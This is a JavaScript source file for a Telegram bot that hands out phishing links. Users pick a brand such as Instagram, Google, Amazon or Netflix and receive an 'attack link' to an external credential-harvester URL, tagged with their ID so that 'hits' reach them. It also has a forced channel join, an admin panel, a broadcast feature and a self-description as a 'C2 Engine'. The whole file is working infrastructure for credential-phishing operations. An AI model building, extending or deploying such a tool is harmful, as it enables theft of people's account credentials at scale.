const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');

// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; 
const CHANNEL_ID = process.env.CHANNEL_ID;
const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: Environment variables are missing. Bot cannot start.");
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const DB_PATH = './db.json';
const adminState = {}; // To track multi-step admin actions

// --- DB Functions ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
const isAdmin = (userId) => {
    const db = readDb();
    return db.admins.includes(parseInt(userId));
};

// --- KEYBOARDS (Using Telegraf's modern Markup) ---
const adminKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
    [Markup.button.callback('🔗 Generate Link', 'admin_generate_link')],
    [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')],
    [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')]
]);

const linkGenerationKeyboard = Markup.inlineKeyboard([
    [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')],
    [Markup.button.callback('🇬 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')],
    [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')],
    [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
]);

// --- /start COMMAND with Force Join ---
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const db = readDb();

    if (db.blocked_users.includes(userId)) return;

    try {
        const chatMember = await ctx.telegram.getChatMember(CHANNEL_ID, userId);
        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) {
            throw new Error("User not in channel");
        }

        if (!db.users[userId]) {
            db.users[userId] = { username: username, joinDate: new Date().toISOString() };
            writeDb(db);
            // NEW FEATURE: Notification for new user
            ctx.telegram.sendMessage(OWNER_ID, `➕ **New User Alert**\n\nUsername: ${username}\nID: ${userId}`);
        }
        
        if (isAdmin(userId)) {
            await ctx.replyWithMarkdown('👑 **Admin Panel** 👑\n\nWelcome back, Operator. All systems are go.', adminKeyboard);
        } else {
            await ctx.replyWithMarkdown('✅ **Welcome!**\n\nSelect a service below to generate a link.', Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)));
        }
    } catch (error) {
        await ctx.replyWithMarkdown(`🛑 **ACCESS DENIED** 🛑\n\nYou must join our channel to use this bot.`, Markup.inlineKeyboard([
            [Markup.button.url('➡️ Join Channel ⬅️', CHANNEL_LINK)],
            [Markup.button.callback('🔄 Joined! Click to Continue 🔄', 'check_join')]
        ]));
    }
});

// --- Callback Handler for ALL buttons ---
bot.on('callback_query', async (ctx) => {
    const userId = ctx.from.id;
    const data = ctx.callbackQuery.data;

    await ctx.answerCbQuery();

    if (data === 'check_join') {
        await ctx.reply("Verification complete. Now please type /start again to access the bot.");
        return;
    }

    const [type, command, service] = data.split('_');

    if (type === 'gen' && command === 'link') {
        const attackLink = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
        await ctx.replyWithMarkdown(`✅ **Link for [${service}]**:\n\`${attackLink}\``);
    }

    if (isAdmin(userId)) {
        if (type === 'admin') {
            switch(command) {
                case 'status':
                    const db = readDb();
                    const totalUsers = Object.keys(db.users).length;
                    await ctx.editMessageText(`📊 **Bot Status**\n\n👥 Total Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
                    break;
                case 'generate':
                    await ctx.editMessageText("🔗 **Admin Link Generator**\nSelect a service. Hits will be sent to YOU.", linkGenerationKeyboard);
                    break;
                case 'panel':
                    await ctx.editMessageText("👑 **Admin Panel** 👑", { parse_mode: 'Markdown', ...adminKeyboard });
                    break;
                default:
                    const prompts = { 'broadcast': '✍️ Send the message to broadcast to all users.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID of the admin to remove.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.'};
                    if (prompts[command]) {
                        adminState[userId] = command;
                        await ctx.reply(prompts[command]);
                    }
                    break;
            }
        }
    }
});

// --- Text Handler for Admin Replies ---
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;

    if (text.startsWith('/') || !adminState[userId]) return;

    const action = adminState[userId];
    delete adminState[userId];

    const db = readDb();
    const targetId = parseInt(text);

    switch (action) {
        case 'broadcast':
            await ctx.reply("📢 Broadcasting your message...");
            let successCount = 0;
            const users = Object.keys(db.users);
            for (const user of users) {
                try {
                    await ctx.telegram.sendMessage(user, text);
                    successCount++;
                } catch (e) {
                    console.log(`Failed to send message to user ${user}`);
                }
            }
            await ctx.reply(`✅ Broadcast sent. Reached ${successCount} users.`);
            break;
        case 'add_admin':
            if (!isNaN(targetId) && !db.admins.includes(targetId)) {
                db.admins.push(targetId); writeDb(db);
                await ctx.reply(`✅ User ${targetId} is now an admin.`);
            } else { await ctx.reply("❌ Invalid ID or user is already an admin."); }
            break;
        // ... (Baaki saare admin actions ka code waisa hi rahega, bas 'await ctx.reply' use karo) ...
    }
});

// Launch the bot
bot.launch();
console.log('🔥 Zero-Lag C2 Engine is online.');

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
